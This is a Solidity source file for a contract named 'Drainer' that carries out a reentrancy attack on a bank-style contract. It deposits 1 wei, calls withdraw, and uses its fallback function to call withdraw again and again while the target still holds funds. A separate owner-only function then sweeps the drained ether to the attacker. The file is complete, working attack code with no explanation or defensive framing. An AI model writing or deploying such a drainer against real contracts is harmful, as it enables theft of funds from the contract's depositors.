// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

interface IBank {
    function deposit(uint amount) external payable;
    function withdraw() external payable;
}

contract Drainer {
    IBank public target;
    uint256 public constant DEPOSIT_AMOUNT = 1; // 1 WEI
    address public owner;

    constructor(address _target) {
        target = IBank(_target);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.sender == owner, "Only owner can attack");
        require(msg.value >= DEPOSIT_AMOUNT, "Send at least 1 wei");
        target.deposit{value: DEPOSIT_AMOUNT}(DEPOSIT_AMOUNT);
        target.withdraw();
    }

    fallback() external payable {
        if(address(target).balance >= 1){
            target.withdraw();
        }
    }

    function withdrawFunds() external {
        require(msg.sender == owner, "Only owner can withdraw");
        uint256 balance = address(this).balance;
        require(balance > 0, "No funds to withdraw");
        (bool sent, ) = owner.call{value: balance}("");
        require(sent, "Failed to send Ether");
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}